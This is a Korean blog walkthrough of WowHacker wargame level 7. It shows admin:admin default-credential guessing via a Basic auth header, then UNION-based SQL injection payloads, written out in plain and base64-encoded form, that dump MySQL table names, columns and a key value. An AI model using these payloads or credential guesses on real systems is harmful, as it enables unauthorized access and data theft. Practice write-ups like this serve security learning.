---
layout: post
title: "[7번 문제] 와우해커(WowHacker Webgemae.level7) 문제풀이"
description: ""
date: 2015-09-08
tags: ['7번', '7본', '문제풀이', '심심', '심심할때', '와우해커', '와우해킹', '워게임', '웹해킹', '정답', '풀이', '해답', '해킹']
comments: true
share: true
---

하루하루 진행하다보니, 일주일사이에 7번 문제풀이를 하게되었네요.

올드좀비님의 Webhacking.kr 도 함께하고 리버싱.kr 도 함께 연재하고있으니 관심있는 분들은 한번봐주시고 피드백도 부탁드립니다.

참고로 오늘은 급하게(?) 포스팅하는 관계로 포스팅에 이전보다 많은 오타가 있을 것으로 보아 지니. . . 오타가 있다면 피드백 좀
부탁드립니다. 주소만 보았을 때, 왠지 Mysql 관련 문제일 것 같네요.

일단 해당 주소로 접근해봅시다.

  

처음에 얻은 정보는 (guest/guest) 게스트 계정 정보를 얻었네요.

  

  

![](/assets/images/posts/86/2757E44155EEC3A51220FF.PNG)

  

  

  

  

흠, 이 문제 이전 5번문제와 매우 비슷한 것 같습니다.

일단 프록실정해주시구요. guest 계정으로 접근해봅시다.

  

"서버 메세지 : Zaemitneun Webgame - Do not attack Bruteforce"

Bruteforce는 무차별 대입공격입니다. 지금 여러 방식으로 변형되어 사용되고있지만 많은 시간이 소요되는 공격기법입니다.

또 서버에 무리를 많이 주기때문에 서버측은 공격자를 빠르게 식별할수있습니다. 하지만 오늘의 문제와는 거리가 멀기때문에 각설하고 . .

  

![](/assets/images/posts/86/264EFC4155EEC3A71CC316.PNG)

  

게스트 계정으로 로그인했습니다.

제가 request 보낸 값입니다. 아파치 취약점을 이용해서 OPTIONS 메서드로 재 Request 값을 보냅니다.

Authorization에 "Z3Vlc3Q6Z3Vlc3Q=" 값은 base64로 인코딩되어있는 값 입니다. 디코딩을 하면
guest:guest 라는 값을 얻습니다.

따라서 우리는 admin:admin이라는 값으로 한번 시도해봅시다. admin:admin 을 base64로 인코딩하면 이와 같은 값을
얻습니다 "YWRtaW46YWRtaW4=" 한번 요청을 보내봅시다.

*guest request

GET http://webgame.wowhacker.com/AuThWithMySQL/ HTTP/1.1

Host: webgame.wowhacker.com

Proxy-Connection: keep-alive

Cache-Control: max-age=0

Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/45.0.2454.85 Safari/537.36 Paros/3.2.13

Accept-Encoding: sdch

Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4

  

*admin request

GET http://webgame.wowhacker.com/AuThWithMySQL/ HTTP/1.1

Host: webgame.wowhacker.com

Proxy-Connection: keep-alive

Cache-Control: max-age=0

Authorization: Basic YWRtaW46YWRtaW4=

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/45.0.2454.85 Safari/537.36 Paros/3.2.13

Accept-Encoding: sdch

Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4

  

![](/assets/images/posts/86/27055B3755EEC47F333458.PNG)

  

  

어드민 계정에 접근했습니다.

게스트 페이지와 다를게 없습니다. 다른거라고는 어드민 기본정보들? 하지만 이 기본정보들이 힌트가 됩니다.(나중참고)

따로 관리 툴이나 어드민 권한을 이용해서 별도의 패널에 접근할수는 없는 것 같습니다.

힌트도 없구요.

  

문제출제의도를 보면 SQL Injection을 통해서 admin 패스워드를 알아내야하는 것 같습니다.

그렇다면 우선 컬럼의 수를 알아봅시다. 컬럼수는 계정정보를보면 쉽게 추측할수있습니다.

"name,group,address,phone number,hitnum + password" 총 6개의 컬럼으로 추측할수있습니다.

계정인증폼으로 돌아가서 아이디란에 admin옆 싱글 쿼터를 닫고 쿼리문을 날려봅니다.

hax0r'union select '1','2','3','4','5','6'#:1234

  

![](/assets/images/posts/86/2376A03555EEC56A25081B.PNG)

  

name = "1",group"3",address"4",phone number"5",hitnum"6" 이라는걸 알았을때, 패스워드컬럼이
두번째 컬럼이라는것을 알수있습니다. 컬럼수가 6개 인것을 확실하게 확인했고, 이제 테이블을 알아내봅시다. 테이블명들을 group 항목으로
출력합시다.

쿼터문 준비하고, 날립니다. hax0r'union select '1','2',(select group_concat(table_name)
from information_schema.tables),'4','5','6'#:1234

aGF4MHIndW5pb24gc2VsZWN0IChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW
5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyksJzInLCczJywnNCcsJzUnLCc2JyM6MTIzNDo=

Authorization 부분을 보면 Basic 인증을 사용하며 아이디와 패스워드에 구분자 ":"를 사용하고있습니다.

또 Request할때 base64로 인코딩 되구요. 따라서 그냥 입력폼에 기본 쿼터문만 입력해도되고 아니면 직접 request할때
base64로 인코딩해서 날리면 됩니다.

  

  

![](/assets/images/posts/86/277FC54A55EEDD2E0FF583.PNG)

  

  

group: CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS
,COLUMN_PRIVILEGES,KEY_COLUMN_USAGE,PROFILING,ROUTINES,SCHEMATA,SCHEMA_PRIVILE
GES,STATISTICS,TABLES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILE
GES,VIEWS,keytable,user_info

  

수상한 테이블 두개를 발견했습니다. 맨 끝에 'keytable','user_info' 테이블입니다.

user_info에는 이전 name = "1",group"3",address"4",phone number"5",hitnum"6" 컬럼이
있나봅니다.

keytable에 어떤 컬럼이 있는지 조회하기 위해서는 "information_schema.columns" 의 "column_name"필드를
이용((select group_concat(column_name) from information_schema.columns where
table_name='keytable'))하면 됩니다.

쿼터문을 짜주시고, 날립시다.

hax0r'union select '1','2',(select group_concat(column_name) from
information_schema.columns where table_name='keytable'),'4','5','6'#:1234

Authorization: Basic aGF4MHIndW5pb24gc2VsZWN0ICcxJywnMicsKHNlbGVjdCBncm91cF9jb
25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGF
ibGVfbmFtZT0na2V5dGFibGUnKSwnNCcsJzUnLCc2JyM6MTIzNA06

  

  

![](/assets/images/posts/86/22270A4955EEE07505AC4C.PNG)

  

![](/assets/images/posts/86/2113214455EEE2D1194F69.PNG)

  

  

keytable의 컬럼명을 얻었습니다. no는 번호인것같고 value 해당 컬럼의 정보갔습니다.

limit을 이용하여 value 컬럼에 있는 값을 뽑아((select value from keytable limit 0,1))봅시다.

쿼터문을 준비하고, 날려줍시다.

hax0r'union select '1','2',(select value from keytable limit
0,1),'4','5','6'#:1234

Authorization: Basic aGF4MHIndW5pb24gc2VsZWN0ICcxJywnMicsKHNlbGVjdCB2YWx1ZSBmc
m9tIGtleXRhYmxlIGxpbWl0IDAsMSksJzQnLCc1JywnNicjOjEyMzQ6

  

  

![](/assets/images/posts/86/2470774E55EEE3B50E8B9C.PNG)

  

키 값을 얻었습니다. "If you dream it, you can do it"

"꿈꿀 수 있다면, 그것을 실현하는 것도 가능하다." 멋진 말 이네요.

  

7번 문제 클리어.

문제는 총 10번까지 있으며 다음은 8번 문제를 연재하겠습니다

8번은 로그인, 인증 관련 문제입니다. 이것도 왠지 인젝션 일 것 같은데.

  

![](/assets/images/posts/86/23237D5055EEE50D1FFCCA.JPEG)

  

  

  

  

  

  

  

  

